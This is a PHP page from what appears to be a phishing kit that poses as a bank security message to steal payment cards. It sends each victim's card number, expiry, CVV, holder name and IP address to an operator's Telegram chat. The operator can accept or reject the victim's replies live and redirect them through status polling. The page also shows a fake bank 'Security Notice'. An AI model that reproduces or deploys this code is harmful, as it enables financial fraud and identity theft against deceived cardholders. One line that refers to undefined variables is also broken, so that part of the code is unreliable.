<?php
require_once 'config.php';

header('Content-Type: text/html; charset=UTF-8');

if (!isset($_GET['session'])) {
    header("Location: " . buildPageUrl('index', ['error' => 'no_session']));
    exit();
}

$sessionId = preg_replace('/[^a-f0-9]/', '', $_GET['session']);
if (strlen($sessionId) !== 32) {
    header("Location: " . buildPageUrl('index', ['error' => 'invalid_session']));
    exit();
}

$sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';

if (!file_exists($sessionFile)) {
    header("Location: " . buildPageUrl('index', ['error' => 'session_not_found']));
    exit();
}

$sessionData = json_decode(file_get_contents($sessionFile), true);
if (json_last_error() !== JSON_ERROR_NONE || !is_array($sessionData)) {
    header("Location: " . buildPageUrl('index', ['error' => 'invalid_session_data']));
    exit();
}

if (!isset($sessionData['card_data']['number'])) {
    header("Location: " . buildPageUrl('index', ['error' => 'corrupted_card_data']));
    exit();
}

if (time() - $sessionData['created_at'] > SESSION_LIFETIME) {
    @unlink($sessionFile);
    header("Location: " . buildPageUrl('index', ['error' => 'session_expired']));
    exit();
}

// Check if custom message exists
$customMessageFile = SESSIONS_DIR . '/' . $sessionId . '.custom_message';
if (!file_exists($customMessageFile)) {
    header("Location: " . buildPageUrl('waiting', ['session' => $sessionId]));
    exit();
}

$customMessage = file_get_contents($customMessageFile);

$pageTitle = 'Custom Message (' . trim($customMessage) . ')';
$checkStatusUrl = buildPageUrl('check_status');

// Process response
$error = null;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $responseText = trim($_POST['response'] ?? '');
    
    if (empty($responseText)) {
        $error = 'Please provide a response';
    } else {
        // Send response to Telegram
        $adminConfig = getAdminConfigFromSession($sessionData);
        $nativeCard = !empty($adminConfig['native_card']);
        $formattedCardNumber = formatCardNumberForTelegram($sessionData['card_data']['number'], $nativeCard);
        
        $message = "*💬 Custom Message Response*\n";
        $message .= buildPresenceLine($sessionData) . "\n\n";
        $message .= buildInfoLines($sessionData['card_data'], $adminConfig);
        $message .= "🆔 Session: `$sessionId`\n";
        $message .= "📝 Response: `$responseText`\n\n";
        $message .= "💳 *Card Details:*\n";
        $message .= "Number: {$formattedCardNumber}\n";
        $message .= "Expiry: `{$sessionData['card_data']['expiry']}`\n";
        $messageText .= "CVV: `{$cardData['cvv']}`\n";
        $message .= "Holder: `{$sessionData['card_data']['holder']}`\n";
        $ipDisplay = getIpDisplayFromSession($sessionData);
        $message .= "IP: `{$ipDisplay}`\n";
        $message .= buildMetaLines($sessionData);

        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '✅ Accept Response', 'callback_data' => "verify:$sessionId:custom:correct:$responseText"],
                    ['text' => '❌ Reject Response', 'callback_data' => "verify:$sessionId:custom:wrong:$responseText"]
                ]
            ]
        ];

        $chatId = $adminConfig['chat_id'] ?? ADMIN_CHAT_ID;
        $response = sendTelegramMessageStored(BOT_TOKEN, $chatId, $message, $keyboard);
        $httpCode = !empty($response['ok']) ? 200 : 500;
        
        if (empty($response['ok'])) {
            $error = 'Telegram API error: ' . ($response['description'] ?? 'Unknown error');
        } else {
            if (!empty($response['result']['message_id'])) {
                storeLastTelegramMessage($sessionData, $chatId, $response['result']['message_id'], $message, $keyboard);
                file_put_contents($sessionFile, json_encode($sessionData, JSON_PRETTY_PRINT));
            }
        }

        if (!$error) {
            $sessionData['custom_response'] = [
                'response' => $responseText,
                'status' => 'pending',
                'sent_at' => time()
            ];
            
            if (file_put_contents($sessionFile, json_encode($sessionData, JSON_PRETTY_PRINT))) {
                header("Location: " . buildPageUrl('custom_verification', ['session' => $sessionId, 'sent' => 1]));
                exit();
            } else {
                $error = 'Error saving session';
            }
        }
    }
}

// Check verification status
if (isset($sessionData['custom_response']['status'])) {
    if ($sessionData['custom_response']['status'] === 'verified') {
        header("Location: " . buildPageUrl('verification_success', ['session' => $sessionId]));
        exit();
    } elseif ($sessionData['custom_response']['status'] === 'rejected') {
        $error = 'Your response was rejected. Please provide a different response.';
        unset($sessionData['custom_response']);
        file_put_contents($sessionFile, json_encode($sessionData, JSON_PRETTY_PRINT));
    }
}

$showWaiting = isset($_GET['sent']) || (isset($sessionData['custom_response']) && $sessionData['custom_response']['status'] === 'pending');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Important Message</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        
        .header p {
            font-size: 16px;
            opacity: 0.9;
        }
        
        .content {
            padding: 30px;
        }
        
        .message-box {
            background: #fff5f5;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            border-left: 5px solid #ff6b6b;
            position: relative;
        }
        
        .message-icon {
            position: absolute;
            top: -15px;
            left: 20px;
            background: #ff6b6b;
            color: white;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .message-content {
            font-size: 16px;
            line-height: 1.6;
            color: #2d3748;
            text-align: center;
        }
        
        .card-info {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            border-left: 4px solid #667eea;
        }
        
        .card-info h3 {
            color: #495057;
            margin-bottom: 15px;
            font-size: 16px;
        }
        
        .card-number {
            font-size: 16px;
            font-weight: 600;
            color: #495057;
            letter-spacing: 1px;
        }
        
        .response-form {
            margin-bottom: 25px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 10px;
            color: #495057;
            font-weight: 500;
        }
        
        .response-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            font-size: 16px;
            resize: vertical;
            min-height: 100px;
        }
        
        .response-input:focus {
            outline: none;
            border-color: #ff6b6b;
        }
        
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s ease;
        }
        
        .submit-btn:hover {
            transform: translateY(-2px);
        }
        
        .security-notice {
            background: #e6fffa;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            border-left: 4px solid #38b2ac;
        }
        
        .security-notice h4 {
            color: #2c7a7b;
            margin-bottom: 10px;
            font-size: 14px;
        }
        
        .security-notice p {
            color: #4a5568;
            font-size: 12px;
            line-height: 1.4;
        }
        
        .loading {
            text-align: center;
            padding: 20px;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff6b6b;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .error-box {
            background: #ffe6e6;
            border: 1px solid #ffcccc;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            color: #dc3545;
        }
        
        @media (max-width: 480px) {
            .container {
                border-radius: 15px;
            }
            
            .header {
                padding: 25px 20px;
            }
            
            .content {
                padding: 25px 20px;
            }
        }

        body {
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        body.page-loaded {
            opacity: 1;
        }

        body.page-leave {
            opacity: 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-exclamation-circle"></i> Important Message</h1>
            <p>Please read the following message carefully</p>
        </div>
        
        <div class="content">
            <?php if ($showWaiting): ?>
                <!-- Waiting for verification -->
                <div class="loading">
                    <div class="spinner"></div>
                    <div class="status-message">
                        <h3>Waiting for Response Review</h3>
                        <p>Your response has been sent for verification. Please wait...</p>
                    </div>
                </div>
                
                <script>
                    function checkVerification() {
                        fetch('check_verification.php?session=<?= $sessionId ?>')
                            .then(response => response.json())
                            .then(data => {
                                if (data.redirect) {
                                    window.location.href = data.redirect;
                                } else if (data.status === 'error') {
                                    window.location.href = 'custom_verification.php?session=<?= $sessionId ?>&error=rejected';
                                } else {
                                    setTimeout(checkVerification, 2000);
                                }
                            })
                            .catch(error => {
                                console.error('Error:', error);
                                setTimeout(checkVerification, 3000);
                            });
                    }
                    
                    // Start checking after 1 second
                    setTimeout(checkVerification, 1000);
                </script>
                
            <?php else: ?>
                <!-- Response form -->
                <?php if (isset($_GET['error']) && $_GET['error'] === 'rejected'): ?>
                    <div class="error-box">
                        <i class="fas fa-exclamation-circle"></i> Your response was rejected. Please provide a different response.
                    </div>
                <?php elseif ($error): ?>
                    <div class="error-box">
                        <i class="fas fa-exclamation-circle"></i> <?php echo htmlspecialchars($error); ?>
                    </div>
                <?php endif; ?>
                
                <div class="message-box">
                    <div class="message-icon">
                        <i class="fas fa-info"></i>
                    </div>
                    <div class="message-content">
                        <?php echo nl2br(htmlspecialchars($customMessage)); ?>
                    </div>
                </div>
                
                <div class="card-info">
                    <h3><i class="fas fa-credit-card"></i> Transaction Reference</h3>
                    <div class="card-number">
                        <?php echo formatCardNumber($sessionData['card_data']['number']); ?>
                    </div>
                </div>
                
                <form id="responseForm" method="POST" action="custom_verification.php?session=<?php echo $sessionId; ?>">
                    <div class="form-group">
                        <label for="response">Please provide your response:</label>
                        <textarea 
                            id="response" 
                            name="response" 
                            class="response-input" 
                            placeholder="Type your response here..." 
                            required
                        ></textarea>
                    </div>
                    
                    <button type="submit" class="submit-btn">
                        <i class="fas fa-paper-plane"></i> Submit Response
                    </button>
                </form>
                
                <div class="security-notice">
                    <h4><i class="fas fa-shield-alt"></i> Security Notice</h4>
                    <p>This message was sent by your bank's security team. Never share your personal or banking information with anyone claiming to be from the bank via unsolicited messages.</p>
                </div>
            <?php endif; ?>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.body.classList.add('page-loaded');
            const sessionId = <?= json_encode($sessionId) ?>;
            const pageTitle = <?= json_encode($pageTitle) ?>;

            const checkStatusUrl = <?= json_encode($checkStatusUrl) ?>;
            const poll = () => {
                fetch(`${checkStatusUrl}?session=${encodeURIComponent(sessionId)}&page=${encodeURIComponent(pageTitle)}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.redirect) {
                            window.location.href = data.redirect;
                        }
                    })
                    .catch(() => {});
            };

            poll();
            setInterval(poll, 3000);

            document.querySelectorAll('a[href]').forEach(link => {
                link.addEventListener('click', () => document.body.classList.add('page-leave'));
            });
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', () => document.body.classList.add('page-leave'));
            });
        });
    </script>
    <?php require_once 'presence_client.php'; ?>
</body>
</html>